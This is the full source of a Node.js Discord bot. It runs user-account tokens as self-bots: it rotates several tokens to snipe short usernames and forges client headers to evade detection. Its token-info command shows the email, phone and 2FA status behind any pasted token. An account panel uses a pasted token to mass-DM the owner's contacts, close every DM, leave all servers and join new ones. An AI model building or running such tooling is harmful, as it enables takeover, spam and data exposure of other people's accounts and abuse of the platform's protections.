const { Client, GatewayIntentBits, Events, InteractionType } = require("discord.js");
const axios = require("axios");

const BOT_TOKEN = process.env.BOT_TOKEN;
const AUTHORIZED_USER_ID = "1539880648326651929";

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

const API_BASE = "https://discord.com/api/v9";
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
const CHARS = "abcdefghijklmnopqrstuvwxyz";

const userConfig = new Map();
const accConfig = new Map();

function defaultConfig() {
    return {
        tokens: [], tokenNames: [], webhookUsers: "", webhookRL: "", delayMs: 20000, 
        isRunning: false, checkedUsernames: new Set(), foundQueue: [], fastSend: false,
        totalTokensAdded: 0, invalidTokensCount: 0
    };
}

function defaultAccConfig() { return { token: null }; }

function createHeaders(token) {
    const superProperties = Buffer.from(JSON.stringify({
        os: "Windows", browser: "Chrome", device: "", system_locale: "en-US",
        browser_user_agent: USER_AGENT, browser_version: "120.0.0.0", os_version: "10",
        release_channel: "stable", client_build_number: 222963, client_event_source: null
    })).toString("base64");

    return {
        Authorization: token, "Content-Type": "application/json", "User-Agent": USER_AGENT,
        "X-Super-Properties": superProperties, "X-Discord-Locale": "en-US",
        "Accept-Language": "en-US,en;q=0.9", Origin: "https://discord.com", Referer: "https://discord.com/"
    };
}

const joinerHeaders = {
    'authority': 'discord.com', 'accept': '*/*', 'accept-language': 'sv,sv-SE;q=0.9',
    'content-type': 'application/json', 'origin': 'https://discord.com', 'referer': 'https://discord.com/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
    'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'sv-SE', 'x-discord-timezone': 'Europe/Stockholm',
    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE2Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InN2IiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTYgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMTg2MDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM1MjM2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='
};

function randomUsername(length) {
    let u = ""; for (let i = 0; i < length; i++) u += CHARS[Math.floor(Math.random() * CHARS.length)]; return u;
}
function randStr(length) {
    let s = ""; for (let i = 0; i < length; i++) s += CHARS[Math.floor(Math.random() * CHARS.length)]; return s;
}
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function sendDM(userId, content) {
    try {
        const dm = await axios.post(`${API_BASE}/users/@me/channels`, { recipient_id: userId }, { headers: { Authorization: `Bot ${BOT_TOKEN}`, "Content-Type": "application/json" } });
        await axios.post(`${API_BASE}/channels/${dm.data.id}/messages`, { content }, { headers: { Authorization: `Bot ${BOT_TOKEN}`, "Content-Type": "application/json" } });
    } catch (err) { console.error("Failed to send DM:", err.message); }
}

async function sendWebhook(webhookUrl, payload, isRateLimit, userId) {
    if (!webhookUrl) return;
    try { await axios.post(webhookUrl, payload, { timeout: 8000 }); }
    catch (error) {
        if (error.response) {
            if (error.response.status === 429) {
                const r = Number(error.response.data?.retry_after) || 5; await sleep(r * 1000);
                return sendWebhook(webhookUrl, payload, isRateLimit, userId);
            } else if (error.response.status === 404 || error.response.status === 403 || error.response.status >= 500) {
                const h = isRateLimit ? "Rate Limit" : "Users Found";
                if (userId) await sendDM(userId, `Your ${h} webhook is invalid or deleted. Please update it.`);
            }
        }
    }
}

async function getAccountInfo(token) { return (await axios.get(`${API_BASE}/users/@me`, { headers: createHeaders(token), timeout: 8000 })).data; }
async function getDMs(token) { return (await axios.get(`${API_BASE}/users/@me/channels`, { headers: createHeaders(token), timeout: 8000 })).data.filter(c => c.type === 1); }
async function getGuilds(token) { return (await axios.get(`${API_BASE}/users/@me/guilds`, { headers: createHeaders(token), timeout: 8000 })).data; }

async function joinServer(token, invite) {
    const c = invite.replace(/https?:\/\/(www\.)?discord\.(gg|com\/invite)\//i, "").split("/")[0].trim();
    const s = await axios.get("https://discord.com", { headers: joinerHeaders, timeout: 8000 });
    const cookies = s.headers['set-cookie'];
    if (cookies) joinerHeaders['cookie'] = cookies.map(c => c.split(';')[0]).join('; ');
    joinerHeaders['Authorization'] = token;
    await axios.post(`${API_BASE}/invites/${c}`, { session_id: randStr(32) }, { headers: joinerHeaders, timeout: 8000 });
}

async function runQueueProcessor(userId) {
    const config = userConfig.get(userId); if (!config) return;
    while (config.isRunning || config.foundQueue.length > 0) {
        if (config.foundQueue.length > 0) {
            const { username, time } = config.foundQueue.shift();
            const payload = { embeds: [{ title: "user found", description: `\`${username}\`\n${username}\n\`\`\`${username}\`\`\`\n\nFound: <t:${time}:R>`, color: 1 }] };
            await sendWebhook(config.webhookUsers, payload, false, userId);
            if (!config.fastSend && (config.foundQueue.length > 0 || config.isRunning)) {
                for (let i = 0; i < Math.floor(config.delayMs / 1000); i++) { if (config.fastSend || !config.isRunning) break; await sleep(1000); }
            }
        } else await sleep(1000);
    }
    config.fastSend = false;
}

async function runSniper(userId) {
    const config = userConfig.get(userId); if (!config || !config.tokens.length) return;
    config.isRunning = true; let ti = 0, cot = 0, tc = 0;
    runQueueProcessor(userId);
    while (config.isRunning) {
        if (config.tokens.length === 0) { await sendDM(userId, "All tokens invalid. Sniper stopped."); config.isRunning = false; break; }
        if (cot >= 90) {
            ti++; cot = 0;
            if (ti >= config.tokens.length) {
                ti = 0; await sendWebhook(config.webhookRL, { content: "All tokens used 90 times. Waiting 1h." }, true, userId);
                for (let i = 0; i < 3600; i++) { if (!config.isRunning) break; await sleep(1000); } continue;
            }
        }
        const token = config.tokens[ti]; const username = randomUsername(5);
        if (config.checkedUsernames.has(username)) continue;
        config.checkedUsernames.add(username);
        try {
            const res = await axios.post(`${API_BASE}/users/@me/pomelo-attempt`, { username }, { headers: createHeaders(token), timeout: 8000 });
            cot++; tc++;
            if (res.data?.taken === false) { config.foundQueue.push({ username, time: Math.floor(Date.now() / 1000) }); }
        } catch (error) {
            if (error.response) {
                if (error.response.status === 400) { cot++; tc++; }
                else if (error.response.status === 429) { const r = Number(error.response.data?.retry_after) || 5; await sendWebhook(config.webhookRL, { content: `RL: ${r}s` }, true, userId); await sleep(r * 1000); }
                else if (error.response.status === 401 || 403) { await sendDM(userId, `Token invalid.`); config.tokens.splice(ti, 1); config.invalidTokensCount++; if (ti >= config.tokens.length) ti = 0; continue; }
                else await sleep(5000);
            } else await sleep(5000);
        }
        await sleep(1500);
    }
}

client.once(Events.ClientReady, async (c) => {
    console.log(`Logged in as ${c.user.tag}`);
    try {
        await c.application.commands.set([
            { name: "2nip3r", description: "Open the username sniper interface." },
            { name: "token-info", description: "Get information from a Discord token." },
            { name: "acc", description: "Open the automated accounts panel." }
        ]);
        console.log("Commands registered.");
    } catch (err) { console.error("Cmd reg error:", err); }
});

client.on(Events.InteractionCreate, async (interaction) => {
    try {
        const userId = interaction.user.id;
        
        // AUTH LOCKS
        if (interaction.isChatInputCommand() && interaction.commandName === "2nip3r" && userId !== AUTHORIZED_USER_ID) return interaction.reply({ flags: 64, content: "Not authorized." }).catch(()=>{});
        if (interaction.isChatInputCommand() && interaction.commandName === "acc" && userId !== AUTHORIZED_USER_ID) return interaction.reply({ flags: 64, content: "Not authorized." }).catch(()=>{});

        if (!userConfig.has(userId)) userConfig.set(userId, defaultConfig());
        if (!accConfig.has(userId)) accConfig.set(userId, defaultAccConfig());
        const config = userConfig.get(userId);
        const acc = accConfig.get(userId);

        // /token-info
        if (interaction.isChatInputCommand() && interaction.commandName === "token-info") {
            return interaction.showModal({ custom_id: "token_info_modal", title: "Token Info", components: [{ type: 1, components: [{ type: 4, custom_id: "ti_token", style: 1, label: "Account Token", required: true }] }] });
        }
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "token_info_modal") {
            await interaction.deferReply({ flags: 64 });
            const token = interaction.fields.getTextInputValue("ti_token").trim();
            try {
                const res = await axios.get(`${API_BASE}/users/@me`, { headers: { Authorization: token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }, timeout: 8000 });
                const data = res.data; const ca = new Date(Number((BigInt(data.id) >> 22n) + 1420070400000n));
                const av = data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.${data.avatar.startsWith("a_") ? "gif" : "png"}?size=256` : null;
                const n = {0:"None",1:"Classic",2:"Nitro",3:"Basic"}[data.premium_type] ?? "Unknown";
                const container = { type: 17, accent_color: 0x5865F2, components: [
                    { type: 10, content: "## Token Info" }, { type: 14, divider: true, spacing: true },
                    { type: 10, content: `**Username:** ${data.username}\n**User ID:** \`${data.id}\`\n**Created:** <t:${Math.floor(ca.getTime() / 1000)}:F>\n**Email:** ${data.email || "N/A"}\n**Phone:** ${data.phone || "N/A"}\n**Verified:** ${data.verified ? "Yes" : "No"}\n**2FA:** ${data.mfa_enabled ? "Yes" : "No"}\n**Nitro:** ${n}\n**Flags:** \`${data.flags ?? 0}\`` }
                ]};
                return interaction.editReply({ flags: 32768, components: [container] });
            } catch (err) { return interaction.editReply({ content: `Invalid token. HTTP ${err?.response?.status ?? "N/A"}` }); }
        }

        // /2nip3r
        if (interaction.isChatInputCommand() && interaction.commandName === "2nip3r") {
            const c = { type: 17, accent_color: 1, components: [
                { type: 10, content: "## 𝐮ֆ𝐞𝐫𝐬" }, { type: 14, divider: true, spacing: true },
                { type: 10, content: "-# • usernames ֆnip3r free ♱\n-# • 📣 •\n-# • provided by Papi KooH\n-# • 📢 •" },
                { type: 14, divider: true, spacing: true },
                { type: 1, components: [{ type: 2, style: 1, label: "ֆnip3r", custom_id: "open_config" }] }
            ]};
            await interaction.channel.send({ flags: 32768, components: [c] }).catch(console.error);
            return interaction.reply({ flags: 64, content: "Deployed." }).catch(console.error);
        }

        // Sniper Buttons
        if (interaction.isButton() && interaction.customId === "open_config") {
            const c = { type: 17, accent_color: 1, components: [
                { type: 10, content: "## configure" }, { type: 14, divider: true, spacing: true },
                { type: 1, components: [
                    { type: 2, style: 2, label: "Tokens", custom_id: "modal_tokens" },
                    { type: 2, style: 2, label: "Webhooks", custom_id: "modal_webhooks" },
                    { type: 2, style: 2, label: "Delay 𝐮ֆ𝐞𝐫𝐬", custom_id: "modal_delay" },
                    { type: 2, style: 3, label: "Start ֆnip3r", custom_id: "start_sniper" },
                    { type: 2, style: 4, label: "Stop ֆnip3r", custom_id: "stop_sniper" }
                ]},
                { type: 1, components: [{ type: 2, style: 2, label: "Info", custom_id: "view_info" }] }
            ]};
            return interaction.reply({ flags: 32768 | 64, components: [c] });
        }
        if (interaction.isButton() && interaction.customId === "view_info") {
            const tL = config.tokenNames.length > 0 ? config.tokenNames.join(", ") : "None";
            const wS = `Users: ${config.webhookUsers ? "Set" : "Not Set"}\nRate Limits: ${config.webhookRL ? "Set" : "Not Set"}`;
            const dS = config.delayMs >= 60000 ? `${config.delayMs / 60000}m` : `${config.delayMs / 1000}s`;
            const c = { type: 17, accent_color: 1, components: [
                { type: 10, content: "## bot info" }, { type: 14, divider: true, spacing: true },
                { type: 10, content: `**Sniper:** ${config.isRunning ? "Active" : "Inactive"}\n**Tokens Put:** ${config.totalTokensAdded}\n**Functional:** ${config.tokens.length}\n**Invalid:** ${config.invalidTokensCount}\n**Delay:** ${dS}\n**Webhooks:**\n${wS}\n**Accounts:** ${tL}` }
            ]};
            return interaction.reply({ flags: 32768 | 64, components: [c] });
        }
        if (interaction.isButton() && interaction.customId === "modal_tokens") return interaction.showModal({ custom_id: "submit_tokens", title: "Configure Tokens", components: [
            { type: 1, components: [{ type: 4, custom_id: "token1", style: 1, label: "Token 1 (Required)", required: true }] },
            { type: 1, components: [{ type: 4, custom_id: "token2", style: 1, label: "Token 2", required: false }] },
            { type: 1, components: [{ type: 4, custom_id: "token3", style: 1, label: "Token 3", required: false }] },
            { type: 1, components: [{ type: 4, custom_id: "token4", style: 1, label: "Token 4", required: false }] },
            { type: 1, components: [{ type: 4, custom_id: "token5", style: 1, label: "Token 5", required: false }] }
        ]});
        if (interaction.isButton() && interaction.customId === "modal_webhooks") return interaction.showModal({ custom_id: "submit_webhooks", title: "Configure Webhooks", components: [
            { type: 1, components: [{ type: 4, custom_id: "hook_users", style: 1, label: "Users Found Webhook", required: true }] },
            { type: 1, components: [{ type: 4, custom_id: "hook_rl", style: 1, label: "Rate Limit Webhook", required: true }] }
        ]});
        if (interaction.isButton() && interaction.customId === "modal_delay") return interaction.showModal({ custom_id: "submit_delay", title: "Configure Delay", components: [
            { type: 1, components: [{ type: 4, custom_id: "delay_value", style: 1, label: "Delay (e.g., 20s, 2m, 1h)", required: true, value: "20s" }] }
        ]});
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "submit_tokens") {
            await interaction.deferReply({ flags: 64 }); const t = [], n = []; let pc = 0;
            for (let i = 1; i <= 5; i++) { const v = interaction.fields.getTextInputValue(`token${i}`); if (v && v.trim()) { pc++; try { const r = await axios.get(`${API_BASE}/users/@me`, { headers: createHeaders(v.trim()), timeout: 8000 }); t.push(v.trim()); n.push(r.data.username); } catch {} } }
            config.tokens = t; config.tokenNames = n; config.totalTokensAdded = pc; config.invalidTokensCount = pc - t.length;
            return interaction.editReply({ content: `Tokens updated. Valid: ${n.join(", ") || "None"}` });
        }
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "submit_webhooks") {
            await interaction.deferReply({ flags: 64 }); config.webhookUsers = interaction.fields.getTextInputValue("hook_users").trim(); config.webhookRL = interaction.fields.getTextInputValue("hook_rl").trim(); return interaction.editReply({ content: "Webhooks updated." });
        }
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "submit_delay") {
            await interaction.deferReply({ flags: 64 }); const v = interaction.fields.getTextInputValue("delay_value").trim().toLowerCase(); const num = parseInt(v); let ms = 20000;
            if (v.endsWith("s")) ms = num * 1000; else if (v.endsWith("m")) ms = num * 60000; else if (v.endsWith("h")) ms = num * 3600000; else ms = num * 1000;
            if (ms < 20000) ms = 20000; config.delayMs = ms; return interaction.editReply({ content: `Delay: ${v}` });
        }
        if (interaction.isButton() && interaction.customId === "start_sniper") {
            if (config.isRunning) return interaction.reply({ flags: 64, content: "Already running." });
            if (!config.tokens.length) return interaction.reply({ flags: 64, content: "No tokens." });
            runSniper(userId); return interaction.reply({ flags: 64, content: "Sniper started." });
        }
        if (interaction.isButton() && interaction.customId === "stop_sniper") {
            if (!config.isRunning) return interaction.reply({ flags: 64, content: "Not running." });
            if (config.foundQueue.length > 0) {
                const c = { type: 17, accent_color: 1, components: [
                    { type: 10, content: `## confirm stop\n\n**${config.foundQueue.length}** users in queue.` }, { type: 14, divider: true, spacing: true },
                    { type: 1, components: [
                        { type: 2, style: 4, label: "Stop ֆnip3r", custom_id: "confirm_stop" },
                        { type: 2, style: 3, label: "Send everything to the webhook.", custom_id: "send_all" },
                        { type: 2, style: 2, label: "view all users", custom_id: "view_all" }
                    ]}
                ]};
                return interaction.reply({ flags: 32768 | 64, components: [c] });
            } else { config.isRunning = false; return interaction.reply({ flags: 64, content: "Sniper stopped. Queue empty." }); }
        }
        if (interaction.isButton() && interaction.customId === "confirm_stop") { config.isRunning = false; config.foundQueue = []; return interaction.update({ content: "Stopped. Queue discarded.", components: [] }); }
        if (interaction.isButton() && interaction.customId === "send_all") {
            await interaction.deferUpdate(); config.isRunning = false; config.fastSend = true;
            while (config.foundQueue.length > 0) await sleep(1000); config.fastSend = false;
            return interaction.followUp({ flags: 64, content: "All sent. Sniper stopped." });
        }
        if (interaction.isButton() && interaction.customId === "view_all") {
            const l = config.foundQueue.map(i => i.username).join("\n") || "No users.";
            const c = { type: 17, accent_color: 1, components: [ { type: 10, content: "## USERS" }, { type: 14, divider: true, spacing: true }, { type: 10, content: l } ] };
            return interaction.reply({ flags: 32768 | 64, components: [c] });
        }

        // /acc COMMAND
        if (interaction.isChatInputCommand() && interaction.commandName === "acc") {
            const c = { type: 17, accent_color: 0x2B2D31, components: [
                { type: 10, content: "## automated accounts" }, { type: 14, divider: true, spacing: true },
                { type: 12, items: [{ media: { url: "https://i.postimg.cc/rmTcLcf2/IMG-6380.gif" } }] },
                { type: 14, divider: true, spacing: true },
                { type: 1, components: [
                    { type: 2, style: 1, label: "Login", custom_id: "acc_login" },
                    { type: 2, style: 2, label: "functions", custom_id: "acc_functions" },
                    { type: 2, style: 4, label: "Log out", custom_id: "acc_logout" }
                ]}
            ]};
            await interaction.channel.send({ flags: 32768, components: [c] }).catch(console.error);
            return interaction.reply({ flags: 64, content: "Panel deployed." }).catch(console.error);
        }

        // /acc BUTTONS
        if (interaction.isButton() && interaction.customId === "acc_login") {
            return interaction.showModal({ custom_id: "acc_login_modal", title: "Login", components: [{ type: 1, components: [{ type: 4, custom_id: "acc_token", style: 1, label: "Account Token", required: true }] }] });
        }
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "acc_login_modal") {
            await interaction.deferReply({ flags: 64 });
            const token = interaction.fields.getTextInputValue("acc_token").trim();
            try {
                const data = await getAccountInfo(token); acc.token = token;
                const dms = await getDMs(token); const guilds = await getGuilds(token);
                const n = {0:"None",1:"Classic",2:"Nitro",3:"Basic"}[data.premium_type] ?? "Unknown";
                const ca = new Date(Number((BigInt(data.id) >> 22n) + 1420070400000n));
                const c = { type: 17, accent_color: 0x57F287, components: [
                    { type: 10, content: "## login successful" }, { type: 14, divider: true, spacing: true },
                    { type: 11, components: [{ type: 10, content: `**Username:** ${data.username}\n**User ID:** \`${data.id}\`\n**Created:** <t:${Math.floor(ca.getTime() / 1000)}:F>\n**Email:** ${data.email || "N/A"}\n**Phone:** ${data.phone || "N/A"}\n**Open DMs:** ${dms.length}\n**Servers:** ${guilds.length}\n**Nitro:** ${n}\n**2FA:** ${data.mfa_enabled ? "Yes" : "No"}` }], accessory: { type: 11, media: { url: `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.${data.avatar.startsWith("a_") ? "gif" : "png"}?size=256` } } }
                ]};
                return interaction.editReply({ flags: 32768, components: [c] });
            } catch (err) { return interaction.editReply({ content: `Invalid token. HTTP ${err?.response?.status ?? "N/A"}` }); }
        }
        if (interaction.isButton() && interaction.customId === "acc_logout") {
            acc.token = null; return interaction.reply({ flags: 64, content: "Logged out." });
        }
        if (interaction.isButton() && interaction.customId === "acc_functions") {
            if (!acc.token) {
                const c = { type: 17, accent_color: 0xED4245, components: [ { type: 10, content: "## error\n\nNo token found. Please use **Login** first." } ] };
                return interaction.reply({ flags: 32768 | 64, components: [c] });
            }
            const c = { type: 17, accent_color: 0x2B2D31, components: [
                { type: 10, content: "## functions" }, { type: 14, divider: true, spacing: true },
                { type: 1, components: [
                    { type: 2, style: 2, label: "Join a server", custom_id: "acc_join" },
                    { type: 2, style: 2, label: "Delete DMs", custom_id: "acc_deldms" },
                    { type: 2, style: 2, label: "Send DMS", custom_id: "acc_senddms" },
                    { type: 2, style: 2, label: "Leave All Servers", custom_id: "acc_leaveall" }
                ]},
                { type: 1, components: [
                    { type: 2, style: 2, label: "View servers", custom_id: "acc_viewservers" },
                    { type: 2, style: 2, label: "Change status", custom_id: "acc_setstatus" },
                    { type: 2, style: 2, label: "Account check", custom_id: "acc_check" }
                ]}
            ]};
            return interaction.reply({ flags: 32768 | 64, components: [c] });
        }

        // /acc FUNCTIONS LOGIC
        if (interaction.isButton() && interaction.customId === "acc_join") return interaction.showModal({ custom_id: "acc_join_modal", title: "Join Server", components: [{ type: 1, components: [{ type: 4, custom_id: "invite_code", style: 1, label: "Invite Link or Code", required: true }] }] });
        if (interaction.isButton() && interaction.customId === "acc_senddms") return interaction.showModal({ custom_id: "acc_senddms_modal", title: "Send DMs", components: [{ type: 1, components: [{ type: 4, custom_id: "dm_message", style: 2, label: "Message to send", required: true }] }] });
        if (interaction.isButton() && interaction.customId === "acc_setstatus") return interaction.showModal({ custom_id: "acc_setstatus_modal", title: "Change Status", components: [{ type: 1, components: [{ type: 4, custom_id: "status_value", style: 1, label: "Status (online, idle, dnd, invisible)", required: true }] }] });

        if (interaction.isButton() && interaction.customId === "acc_check") {
            await interaction.deferReply({ flags: 64 });
            try {
                const data = await getAccountInfo(acc.token);
                const c = { type: 17, accent_color: 0x57F287, components: [ { type: 10, content: `## account check\n\n✅ Valid Token\n**User:** ${data.username} (\`${data.id}\`)\n**Email:** \`${data.email || "N/A"}\`` } ] };
                return interaction.editReply({ flags: 32768, components: [c] });
            } catch { return interaction.editReply({ content: "❌ Invalid token." }); }
        }
        if (interaction.isButton() && interaction.customId === "acc_viewservers") {
            await interaction.deferReply({ flags: 64 });
            try {
                const guilds = await getGuilds(acc.token); if (!guilds.length) return interaction.editReply({ content: "No servers." });
                const list = guilds.map((g, i) => `**${i + 1}.** ${g.name} — \`${g.id}\``).join("\n");
                const c = { type: 17, accent_color: 0x5865F2, components: [ { type: 10, content: `## servers (${guilds.length})` }, { type: 14, divider: true, spacing: true }, { type: 10, content: list.slice(0, 4000) } ] };
                return interaction.editReply({ flags: 32768, components: [c] });
            } catch (err) { return interaction.editReply({ content: `Error: ${err.message}` }); }
        }
        if (interaction.isButton() && interaction.customId === "acc_deldms") {
            await interaction.deferReply({ flags: 64 });
            try {
                const dms = await getDMs(acc.token); if (!dms.length) return interaction.editReply({ content: "No DMs." });
                let del = 0; for (const ch of dms) { try { await axios.delete(`${API_BASE}/channels/${ch.id}`, { headers: createHeaders(acc.token), timeout: 8000 }); del++; } catch {} await sleep(400); }
                return interaction.editReply({ content: `✅ Closed **${del}** DMs.` });
            } catch (err) { return interaction.editReply({ content: `Error: ${err.message}` }); }
        }
        if (interaction.isButton() && interaction.customId === "acc_leaveall") {
            await interaction.deferReply({ flags: 64 });
            try {
                const guilds = await getGuilds(acc.token); if (!guilds.length) return interaction.editReply({ content: "No servers." });
                let left = 0; for (const g of guilds) { try { await axios.delete(`${API_BASE}/users/@me/guilds/${g.id}`, { headers: createHeaders(acc.token), timeout: 8000 }); left++; } catch {} await sleep(500); }
                return interaction.editReply({ content: `✅ Left **${left}** servers.` });
            } catch (err) { return interaction.editReply({ content: `Error: ${err.message}` }); }
        }

        // /acc MODALS
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "acc_join_modal") {
            await interaction.deferReply({ flags: 64 }); const invite = interaction.fields.getTextInputValue("invite_code").trim();
            try { await joinServer(acc.token, invite); return interaction.editReply({ content: `✅ Joined server.` }); }
            catch (err) { return interaction.editReply({ content: `❌ Error: \`${err.response?.data?.message || err.message}\`` }); }
        }
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "acc_senddms_modal") {
            await interaction.deferReply({ flags: 64 }); const msg = interaction.fields.getTextInputValue("dm_message").trim();
            try {
                const dms = await getDMs(acc.token); if (!dms.length) return interaction.editReply({ content: "No DMs." });
                let sent = 0, fail = 0; for (const ch of dms) { try { await axios.post(`${API_BASE}/channels/${ch.id}/messages`, { content: msg }, { headers: createHeaders(acc.token), timeout: 8000 }); sent++; } catch { fail++; } await sleep(1200); }
                return interaction.editReply({ content: `✅ Sent to **${sent}** DMs. Failed: **${fail}**.` });
            } catch (err) { return interaction.editReply({ content: `Error: ${err.message}` }); }
        }
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "acc_setstatus_modal") {
            await interaction.deferReply({ flags: 64 }); const st = interaction.fields.getTextInputValue("status_value").trim().toLowerCase();
            if (!["online", "idle", "dnd", "invisible"].includes(st)) return interaction.editReply({ content: "❌ Invalid status." });
            try { await axios.patch(`${API_BASE}/users/@me/settings`, { status: st }, { headers: createHeaders(acc.token), timeout: 8000 }); return interaction.editReply({ content: `✅ Status changed to ${st}.` }); }
            catch (err) { return interaction.editReply({ content: `❌ Error: \`${err.response?.data?.message || err.message}\`` }); }
        }

    } catch (err) {
        console.error("Interaction Error:", err);
        if (interaction.isRepliable() && !interaction.replied) await interaction.reply({ content: "An error occurred.", flags: 64 }).catch(()=>{});
        else if (interaction.isRepliable() && interaction.deferred) await interaction.editReply({ content: "An error occurred." }).catch(()=>{});
    }
});

client.login(BOT_TOKEN);
